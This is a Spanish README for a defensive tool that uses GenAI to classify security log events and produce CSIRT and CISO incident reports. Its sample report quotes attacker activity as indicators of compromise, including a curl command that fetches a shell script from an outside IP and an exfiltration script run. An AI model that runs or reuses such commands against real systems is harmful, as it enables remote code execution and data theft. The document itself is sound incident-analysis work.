# challenge-GenIA
# 🛡️ Challenge – Análisis de Logs con GenAI

Este script (`challenge.py`) implementa un **microservicio de análisis de incidentes** utilizando modelos de **GenAI (OpenAI o Gemini)**.  
Su objetivo es asistir en la gestión de incidentes de seguridad a partir de un archivo `.log`.

---

## ✨ Funcionalidades

- Ingesta de archivos `.log` (línea por línea).  
- Clasificación de eventos como:
  - **Críticos**: actividad sospechosa, intentos de intrusión, exfiltración, reverse shells, etc.  
  - **Informativos**: actividad normal o de bajo riesgo.  
- Generación automática de:
  - **Reporte CSIRT** (timeline crítico, IOC feed, TTPs MITRE ATT&CK, estadísticas, recomendaciones).  
  - **Reporte CISO** (narrativo ejecutivo panorama general, riesgos, próximos pasos).  
- Consultas a **VirusTotal** para reputación de IPs públicas.  
- Salidas organizadas en múltiples formatos:  
  - `classified_events.yaml`: clasificación detallada de cada evento.  
  - `csirt_report.md`: informe técnico para equipos de respuesta.  
  - `ciso_report.md`: informe ejecutivo para la gerencia.  
  - `vt_results.json`: resultados de reputación de IPs (si no se usa `--skip-vt`).  

---

## 📦 Requisitos

Python 3.9+  
Librerías necesarias:

```
pip install openai google-generativeai pyyaml requests
```

Además, debes configurar tus **API Keys** como variables de entorno:

```
export OPENAI_API_KEY="tu_api_key_openai"
export GEMINI_API_KEY="tu_api_key_gemini"
export VT_API_KEY="tu_api_key_virustotal"   # opcional
```

---

## 🚀 Uso

```
python3 challenge.py --input sample.log --outdir resultados --provider openai
```

### Parámetros disponibles

- `--input` → Archivo `.log` a analizar (obligatorio).  
- `--outdir` → Carpeta donde se guardarán los artefactos generados.  
- `--provider` → Motor de IA a usar: `openai` o `gemini` (default: `openai`).  
- `--skip-vt` → Omitir consultas a VirusTotal.  
- `--debug` → Mostrar información detallada de depuración.  

---

## 📂 Ejemplo de Ejecución

```
python3 challenge.py --input ../../logs/sim_incident.log --outdir resultados --provider gemini --debug
```

Salida esperada:

```
📂 Artefactos generados en resultados/
```

Archivos en el directorio:

- `classified_events.yaml` → Clasificación de todos los eventos.  
- `csirt_report.md` → Informe técnico con timeline, IOC feed, TTPs y recomendaciones.  
- `ciso_report.md` → Informe ejecutivo para CISO/gerencia.  
- `vt_results.json` → Reputación de IPs públicas (si no se usa `--skip-vt`).  

---

## 🧪 Ejemplo de Salida (`csirt_report.md`)

```
## Reporte CSIRT
### Timeline de Eventos Críticos
- 2024-08-15 01:02:20 – IP 185.23.91.10 (RU, ASN123) – Ejecución de `/usr/bin/python3 exfil.py` → intento de exfiltración.
- 2024-08-15 01:15:52 – IP 185.23.91.10 (RU, ASN123) – `curl http://185.23.91.10/shell.sh` → intento de reverse shell.

### Tabla de TTPs
| TTP ID | Descripción                        | Actor asociado |
|--------|------------------------------------|----------------|
| T1059  | Command and Scripting Interpreter  | APT28          |
| T1041  | Exfiltration over C2 Channel       | Desconocido    |

### IOC Feed
- IP: 185.23.91.10  
- Script: exfil.py  
- Comando: curl shell.sh  

### Estadísticas
- Total eventos: 300  
- Críticos: 24  
- Informativos: 276  
- % Críticos: 8%  

### Recomendaciones Inmediatas
1. Bloquear IPs asociadas al incidente.  
2. Aislar host afectado.  
3. Revisar credenciales utilizadas.  
4. Validar integridad de los logs.  
5. Ejecutar investigación forense completa.  
```

---

## 📋 Ejemplo de Salida (`ciso_report.md`)

```
## Reporte CISO
Durante el análisis de los logs se identificó actividad sospechosa proveniente de direcciones IP extranjeras, asociadas a intentos de exfiltración y creación de shells reversos.  
Se detectaron múltiples accesos no autorizados a rutas administrativas, lo que sugiere un compromiso en curso.  
(...)
```
 
> Contiene panorama general, actores principales, impacto potencial, riesgos globales (0-100) y próximos pasos estratégicos.  

---

## 🔮 Próximos pasos recomendados

- Integrar este script en un pipeline CI/CD de seguridad.  
- Conectar con un SIEM (Splunk/ELK) para ingesta automática.  
- Extender soporte a otros formatos de log (syslog, Windows Event Logs).  
- Generar reportes adicionales (ej: cumplimiento regulatorio).
- Mejorar la performance y costo.
